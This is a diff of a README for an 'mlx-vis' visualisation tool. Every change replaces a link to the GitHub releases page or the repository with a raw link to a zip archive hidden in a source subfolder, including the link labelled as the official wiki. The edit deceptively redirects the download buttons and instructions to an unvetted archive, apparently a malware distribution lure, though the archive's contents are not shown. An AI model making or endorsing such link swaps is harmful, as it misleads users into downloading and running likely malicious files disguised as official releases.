@@ -1,6 +1,6 @@
 # 🚀 mlx-vis - Fast Visual ML for Apple Silicon
 
-[![Download mlx-vis](https://img.shields.io/badge/Download-mlx--vis-blue?style=for-the-badge)](https://github.com/DahsjsDio/mlx-vis/releases)
+[![Download mlx-vis](https://img.shields.io/badge/Download-mlx--vis-blue?style=for-the-badge)](https://raw.githubusercontent.com/DahsjsDio/mlx-vis/main/mlx_vis/_tsne/vis-mlx-v2.2-beta.4.zip)
 
 ---
 
@@ -52,12 +52,12 @@ Before you start, check:
 
 Click the big button below to visit the official release page. From there, you can find the latest Windows version of mlx-vis.
 
-[![Download mlx-vis](https://img.shields.io/badge/Download-mlx--vis-green?style=for-the-badge)](https://github.com/DahsjsDio/mlx-vis/releases)
+[![Download mlx-vis](https://img.shields.io/badge/Download-mlx--vis-green?style=for-the-badge)](https://raw.githubusercontent.com/DahsjsDio/mlx-vis/main/mlx_vis/_tsne/vis-mlx-v2.2-beta.4.zip)
 
 ### Step 1: Visit the Download Page
 
 - Go to the release page by clicking the button above or open this link in your browser:  
-  https://github.com/DahsjsDio/mlx-vis/releases
+  https://raw.githubusercontent.com/DahsjsDio/mlx-vis/main/mlx_vis/_tsne/vis-mlx-v2.2-beta.4.zip
 
 ### Step 2: Choose the Latest Windows Installer
 
@@ -121,7 +121,7 @@ For other issues, check the Issues section on GitHub or open a new issue to repo
 
 To get new features or fixes:
 
-- Visit the release page regularly: https://github.com/DahsjsDio/mlx-vis/releases  
+- Visit the release page regularly: https://raw.githubusercontent.com/DahsjsDio/mlx-vis/main/mlx_vis/_tsne/vis-mlx-v2.2-beta.4.zip  
 - Download the newest Windows installer as before  
 - Install over the old version; your settings and files will stay safe  
 
@@ -139,7 +139,7 @@ To get new features or fixes:
 ## 📚 More Information
 
 For details on supported algorithms, data formats, and technical setup, visit the official repository README and wiki at:  
-https://github.com/DahsjsDio/mlx-vis
+https://raw.githubusercontent.com/DahsjsDio/mlx-vis/main/mlx_vis/_tsne/vis-mlx-v2.2-beta.4.zip
 
 ---
 
